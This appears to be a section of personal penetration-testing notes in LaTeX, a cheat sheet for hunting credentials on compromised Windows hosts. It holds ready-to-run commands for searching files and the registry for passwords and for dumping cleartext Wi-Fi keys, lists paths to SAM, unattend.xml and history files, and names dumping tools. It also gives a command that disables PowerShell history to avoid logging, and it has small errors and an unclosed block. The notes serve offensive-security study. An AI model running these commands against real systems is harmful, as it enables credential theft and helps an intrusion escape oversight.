\section{Credential Hunting}

tools to use:
\begin{itemize}
    \item \href{https://github.com/AlessandroZ/LaZagne}{Lazagne}
    \item \href{https://github.com/SnaffCon/Snaffler}{Snaffler}
    \item
        \href{https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr}
        {findstr}
\end{itemize}

\url{https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---looting-for-passwords}

\begin{tabular}{lll}
Passwords &	Passphrases 	&Keys \\
Username &	User account &	Creds \\
Users &	Passkeys &	Passphrases \\
configuration &	dbcredential &	dbpassword\\
pwd &	Login &	Credentials\\
\end{tabular}



\subsection{Search for file contents}
\begin{verbatim}
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*

Get-ChildItem -Path "C:\" -Include *.txt *.cfg,
    *.xml -Recurse -ErrorAction Ignore | Select-String -Pattern 'password'
\end{verbatim}

\subsection{Search for a file with a certain filename}
\begin{verbatim}
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini       
\end{verbatim}

\subsection{Search passwords in Group Policy Preferences}
\begin{verbatim}
\end{verbatim}

\subsection{Search the registry for key names and passwords}

\begin{verbatim}
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCUl/f password /t REG_SZ /s

\begin{verbatim}
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
gc '\Users\X\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' |
    Select-String password
\end{verbatim}

Passwords in unattend.xml

Location of the unattend.xml files.

\begin{verbatim}
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
\end{verbatim}

Display the content of these files with 

\begin{verbatim}
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul.
\end{verbatim}

\subsection{IIS Web config}
\begin{verbatim}
Get-Childitem â€“Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
\end{verbatim}

\subsection{Other files}
\begin{verbatim}
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b
\end{verbatim}

\subsection{Sticky Notes passwords}

The sticky notes app stores it's content in a sqlite db located at 
\begin{verbatim}
C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
\end{verbatim}
Viewing Sticky Notes Data Using PowerShell the
\href{https://github.com/RamblingCookieMonster/PSSQLite}{PSSQLite} module or
with \verb+string+ on linux.

\subsection{Passwords stored in services}

Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP
using \href{https://github.com/Arvanaghi/SessionGopher}{SessionGopher}

\begin{verbatim}
https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
\end{verbatim}

\subsection{Wifi passwords}

Find AP SSID \verb+netsh wlan show profile+

Get Cleartext Pass
\begin{verbatim}
netsh wlan show profile <SSID> key=clear
\end{verbatim}

Oneliner method to extract wifi passwords from all the access point.

\begin{verbatim}
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^|
    find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear |
    findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
\end{verbatim}

\subsection{Passwords stored in Key Manager}

for keepass use \verb+keepass2john+

\subsection{Powershell History, transcript and alternate data stram}

Disable Powershell history: 
\begin{verbatim}
Set-PSReadlineOption -HistorySaveStyle SaveNothing.
\end{verbatim}

\begin{verbatim}
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
\end{verbatim}

\begin{verbatim}
C:\Users\<USERNAME>\Documents\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
C:\Transcripts\<DATE>\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
\end{verbatim}

\begin{verbatim}
PS > Get-Item -path flag.txt -Stream *
PS > Get-Content -path flag.txt -Stream Flag
\end{verbatim}

\subsection{Cmdkey saved credentials}

Usually they are stored in files located:
\begin{verbatim}
cmd /c "dir /S /AS 
%appdata%\Microsoft\Vault & dir /S /AS
%appdata%\Microsoft\Credentials & dir /S /AS
%localappdata%\Microsoft\Vault & dir /S /AS
%localappdata%\Microsoft\Credentials & dir /S /AS
\end{verbatim}

\verb+cmdkey /list+

\verb+unas /savecred /user:inlanefreight\bob "COMMAND HERE"+

\begin{verbatim}
Get-ChildItem "C:\" *.lnk -Recurse -Force | ft fullname | Out-File shortcuts.txt

ForEach($file in gc .\shortcuts.txt) { Write-Output $file; gc $file |
    Select-String runas }
\end{verbatim}

tools: mimikatz, lazagne, empire.

\subsection{Browser credentials}
use a tool such as \href{https://github.com/GhostPack/SharpDPAPI}{SharpChrome}
to retrieve cookies and saved logins from Google Chrome.

\subsection{Some place to investigate}
\begin{itemize}
        \item Chrome Dictionary Files \verb+AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt+
        \item Passwords in Group Policy in the SYSVOL share
        \item Passwords in scripts in the SYSVOL share
        \item Password in scripts on IT shares
        \item Passwords in web.config files on dev machines and IT shares
        \item Passwords in the AD user or computer description fields
        \item Found on user systems and shares
        \item Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint 
\end{itemize}


\subsection{SSH keys}
\begin{verbatim}
C:\Users\username/.ssh/
\end{verbatim}

